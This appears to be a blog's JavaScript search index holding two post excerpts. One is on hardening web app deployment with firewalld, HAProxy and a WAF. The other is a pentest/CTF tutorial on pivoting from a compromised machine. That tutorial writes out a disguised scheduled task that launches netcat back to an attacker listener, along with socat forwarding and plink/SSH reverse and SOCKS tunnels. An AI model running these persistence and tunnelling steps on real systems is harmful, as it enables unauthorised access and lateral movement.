var store = [{
        "title": "Ideas on Scaling up Security Architecture for Deploying Web Apps",
        "excerpt":"Let us take a case of a mid sized company which wants to scale up its security architecture for the client facing website. As per the terms of reference, they want minimum disruption in their existing workflow and any kind of code rewrite is not on the platter. They have a classic deployment in which the website is hosted on Virtual Private Servers (VPS).      The first step is to minimize the attack surface by limiting access to the hosted infrastructure (VPS) for authorized traffic:ports (TCP:443). Thereafter, we can limit access to web APIs and monitor the incoming traffic on the exposed public APIs.    Now, having worked out the design goals, we can rework the architecture of our deployment. Of course there are many ways to go about the security architecture, but one of the ways was to enable/introduce the following artifacts.      Infrastructure Firewall   Proxy / Load balancer   Web Application Firewall      Infrastructure Firewall  The infrastructure firewall will take care that all traffic except that meant for http and https is dropped at our Virtual Private Server (VPS). We can also configure the firewall in a way in which our proxy/load balancers are accessible from specific IPs/subnets. Some of the sample rules in our firewalld of CentOS7 as given here:   Firewalld Rules  # Step 1: Create a trusted Zone having whitelisted IP / subnet. firewall-cmd --permanent --add-source=10.10.10.10 --zone=trusted &amp;  # Step 2: Add service http and https to the trusted zone firewall-cmd --permanent --add-service=http --zone=trusted &amp; firewall-cmd --permanent --add-service=https --zone=trusted &amp;  # Step 3: Remove service http and https from the public zone firewall-cmd --permanent --remove-service=http --zone=public &amp; firewall-cmd --permanent --remove-service=https --zone=public &amp; firewall-cmd --reload   Proxy / Load balancer  The proxy will ensure that our website is not directly exposed to the outside world and has additional benefits of load balancing. We can setup Access Control Lists (ACLs) so that only specific endpoints of our website APIs are accessible from outside. This will also safeguard any accidental exposure of our internal APIs. Some of the sample configuration settings for the HAproxy could be as follows:   HAProxy Config Rules  frontend httpsandhttp         bind *:80         bind *:443 ssl crt /etc/ssl/haproxy.pem         # Redirect traffic to https                 http-request redirect scheme https unless { ssl_fc }         mode http         acl app1 path_end -i /app1         acl app2 path_end -i /app2    \t     \tuse_backend app1Servers if app1      \tuse_backend app2Servers if app2  backend app1Servers         balance roundrobin                 mode http         server webserver1 127.0.0.1:2222 check weight 1 maxconn 50 ssl verify none          backend app2Servers         balance roundrobin                 mode http         server webserver2 127.0.0.1:3333 check weight 1 maxconn 50 ssl verify none  Web Application Firewall  The traffic from our proxy now goes through the Web Application Firewall. This is configured to thwart common web application vulnerabilities. We could use the open source WAF like modsecurity or vendor dependent one. The WAFs also have the settings to configure it as proxy for sending the actual website traffic. We can run everything in a containerised environment using docker or Kubernetes.   Reference     https://www.youtube.com/watch?v=qYnA2DFEELw   https://www.haproxy.com/blog/redirect-http-to-https-with-haproxy/   ","categories": [],
        "tags": [],
        "url": "/musings/web-apps/",
        "teaser": null
      },{
        "title": "Understanding SSH Tunnelling and Proxychains",
        "excerpt":"Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.   Problem Statement  We have gained an initial foothold on one of the internal system of an organization. Now, we want to pivot to other systems and for this we require to run nmap scans on the internal networks. May be the organization is also running an internally hosted website which is not accessible from outside.How do we expose the internal ports/traffic to the outside attacker machine so that we can run our tools and gain access to resources which are not exposed to the outside world?   Setup  The setup is given in figure below:    For our penetration testing of the website we have been given a PC where we can setup the proxy. In penetration testing terms let’s call it a victim PC.   Actions at Victim Machine  Step 1 (Optional):  Let us assume,we have made an entry into the task scheduler of the victim machine. It will run the netcat.exe once it boots up and will connect with the listener running in the Kali machine.   Let’s make the task scheduler entry, to run the task once a day  # Make entry in task scheduler  SCHTASKS /CREATE /SC DAILY /TN \"SystemTask\\system Updates\" /TR \"c:\\Users\\Dell\\AppData\\Roaming\\WinUpdate\\netcat.exe\" /ST 10:00  Step 2:  Once, we get the victim machine command prompt back to our Kali machine, we will start the socate.exe. This program will forward the traffic to its local port:  socate.exe TCP-LISTEN:8080,fork,reuseaddr TCP:&lt;target-server-ip&gt;:443  Once the traffic has been forwarded to a specific port, in our case 8080, we can verify the same through netstat command:  # Now check if the port has been forwarded netstat -ano // check connection  Step 3:  We will redirect the traffic of the victim PC to the Virtual Private Server (VPS) through SSH tunnel, using plink.exe for windows.  # Connect with VPS plink.exe -l &lt;username&gt; -pw &lt;password&gt; -R 8080:127.0.0.1:8080 &lt;vps ip&gt;   Actions at VPS Machine  # To check with curl /etc/hosts 127.0.0.1 &lt;domain-name&gt;  Forward Traffic to Kali Machine from VPS  # On Kali Machine ssh -g -L 8080:localhost:8080 -f -N &lt;username&gt;@&lt;vps ip&gt; // this use when want to open localhost  Now open the browser and enter  http://&lt;domain-name&gt;:8080   Configure SOCKS5 proxy  Actions at victim machine  plink.exe -l &lt;username&gt; -pw &lt;password&gt; -D 8080:127.0.0.1:8080 &lt;vps ip&gt;  Actions at VPS  Install proxychains  $ yum install proxychains $ nano /etc/proxychain.conf socks5 &lt;vps-public-ip&gt; 8080  Check on terminal  $ proxychains curl www.myweb.com  On Kali Machine  Do settings in the browser, if we want to open websites in browser   In case you want to use terminal for traffic and not browser, perform following steps  $ yum install proxychains  # nano /etc/proxychain.conf socks5 &lt;vps-public-ip&gt; 8080  Check on terminal  $ proxychains curl www.myweb.com   Reference     https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d  ","categories": [],
        "tags": [],
        "url": "/musings/ssh-tunnel/",
        "teaser": null
      }]
